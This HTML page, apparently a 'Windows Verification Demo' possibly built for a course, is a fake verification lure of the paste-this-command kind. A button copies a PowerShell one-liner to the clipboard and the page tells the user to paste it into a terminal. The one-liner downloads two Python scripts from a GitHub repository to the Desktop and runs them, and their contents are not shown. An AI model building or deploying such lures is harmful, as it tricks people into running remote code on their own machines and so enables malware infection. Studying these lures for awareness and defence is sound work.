<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Windows Verification Demo</title>
  <style>
    body {
      background: #202225;
      font-family: sans-serif;
      color: #fff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .box {
      background: #2f3136;
      padding: 24px 30px;
      border-radius: 10px;
      width: 420px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
    }
    .btn {
      background: #5865f2;
      border: none;
      padding: 12px 18px;
      width: 100%;
      color: white;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
      border-radius: 5px;
    }
    .btn:hover {
      background: #4752c4;
    }
    #toast {
      display: none;
      margin-top: 15px;
      font-size: 14px;
      color: #3ba55d;
    }
  </style>
</head>

<body>

<div class="box">
  <h2>Windows Verification Demo</h2>
  <p>Click to copy the PowerShell command to your clipboard.</p>

  <button class="btn" id="copyBtn">Copy Windows Command</button>

  <div id="toast">Command copied. Open Microsoft Terminal → paste → Enter.</div>
</div>

<script>
  // Windows PowerShell command (downloads to Desktop & executes in order)
  const psCommand = `
cd "$env:USERPROFILE\\Desktop";
Invoke-WebRequest "https://raw.githubusercontent.com/Elkan-Sun/CPSC_5710/main/setup.py" -OutFile "setup.py";
Invoke-WebRequest "https://raw.githubusercontent.com/Elkan-Sun/CPSC_5710/main/magic.py" -OutFile "magic.py";
python setup.py;
python magic.py;
  `.trim();

  document.getElementById("copyBtn").onclick = async () => {
    try {
      await navigator.clipboard.writeText(psCommand);
      document.getElementById("toast").style.display = "block";
    } catch (err) {
      alert("Copy failed. Here is the command:\n\n" + psCommand);
    }
  };
</script>

</body>
</html>
